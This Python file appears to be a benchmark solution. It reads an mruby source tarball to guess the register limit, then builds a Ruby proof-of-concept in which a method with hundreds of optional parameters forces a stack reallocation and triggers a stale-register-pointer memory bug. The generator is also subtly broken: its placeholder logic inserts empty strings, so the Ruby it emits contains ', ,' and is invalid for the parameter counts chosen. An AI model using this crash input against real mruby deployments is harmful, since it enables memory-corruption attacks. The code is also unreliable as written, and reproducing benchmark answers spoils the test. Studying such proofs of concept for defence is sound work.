import tarfile
import io
import re

class Solution:
    def _detect_max_reg(self, src_path: str) -> int:
        # Try to detect register width from ops/insn headers; default to 255 (8-bit)
        candidates = [
            re.compile(r'GETARG_A\s*\(\s*[^)]*\)\s*[^&]*&\s*(0x[0-9a-fA-F]+|\d+)'),
            re.compile(r'#define\s+MAXARG_A\s+(0x[0-9a-fA-F]+|\d+)'),
        ]
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                for m in tf.getmembers():
                    name = m.name.lower()
                    if not m.isfile():
                        continue
                    if not any(x in name for x in ('ops.h', 'insn.h', 'opcode.h', 'vm.h', 'opcode_def.h', 'mruby/ops.h', 'mruby/insn.h')):
                        continue
                    try:
                        data = tf.extractfile(m).read().decode('utf-8', errors='ignore')
                    except Exception:
                        continue
                    for pat in candidates:
                        for match in pat.finditer(data):
                            val = match.group(1)
                            try:
                                if val.startswith('0x') or val.startswith('0X'):
                                    mask = int(val, 16)
                                else:
                                    mask = int(val, 10)
                                # If this is a mask like 0xff, max value is mask itself.
                                if mask > 0 and mask < (1 << 20):  # sanity
                                    # A register index is limited by mask, so max index is mask
                                    # Use a conservative limit just below mask to avoid edge cases
                                    return min(mask, 0xffff)
                            except Exception:
                                continue
        except Exception:
            pass
        return 255

    def _build_poc(self, nargs: int) -> bytes:
        # Build a Ruby program that defines a method with many optional parameters
        # to force mrb_stack_extend at method entry (OP_ENTER), which triggers the bug
        # in vulnerable versions where regs pointer is not adjusted after reallocation.
        parts = []
        parts.append("def boom(")
        # Generate parameters with default nil, break lines for readability
        line = []
        for i in range(nargs):
            line.append(f"a{i}=nil")
            if (i + 1) % 20 == 0:
                parts.append(", ".join(line))
                parts.append(",\n")
                line = []
            else:
                if i != nargs - 1:
                    line.append("")  # placeholder for comma insertion below
        if line:
            # Clean empty placeholders and join
            filtered = [x for x in line if x]
            if filtered:
                parts.append(", ".join(filtered))
        parts.append(")\n")
        parts.append("  nil\n")
        parts.append("end\n")
        # Call the method; a single call should suffice, but we call it a few times
        # to increase the chance of hitting reallocation conditions across allocators.
        parts.append("3.times { boom() }\n")
        s = "".join(parts)
        return s.encode('utf-8')

    def solve(self, src_path: str) -> bytes:
        max_reg = self._detect_max_reg(src_path)
        # Choose number of args conservatively below detected max register index
        # to avoid compiler limits. Also ensure it's large enough to likely trigger
        # a stack extension from the default initial stack size (commonly ~128).
        if max_reg >= 1000:
            nargs = 900
        elif max_reg >= 512:
            nargs = 450
        else:
            # For 8-bit (255) or similar, keep a safe margin
            nargs = min(250, max_reg - 5 if max_reg > 5 else 200)
        return self._build_poc(nargs)
